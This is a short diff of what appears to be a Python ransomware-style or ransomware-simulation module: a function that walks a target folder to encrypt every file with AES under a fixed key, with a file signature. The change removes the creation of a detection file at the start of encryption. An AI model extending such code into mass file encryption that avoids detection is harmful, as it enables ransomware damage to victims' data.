@@ -3,7 +3,7 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from modules.utils import log_action
 from modules.utils import log_summary
-from modules.constants import DETECTION_FILE, TARGET_FOLDER
+from modules.constants import TARGET_FOLDER
 
 
 # מפתח קבוע (32 bytes == 256bit)
@@ -12,7 +12,6 @@ SIGNATURE = b"BME1"
 CHUNK_SIZE = 10 * 1024
 
 def encrypt_files(folder: str = TARGET_FOLDER):
-    open(DETECTION_FILE, "w").close()
 
     for root, _, files in os.walk(folder):
         for name in files:
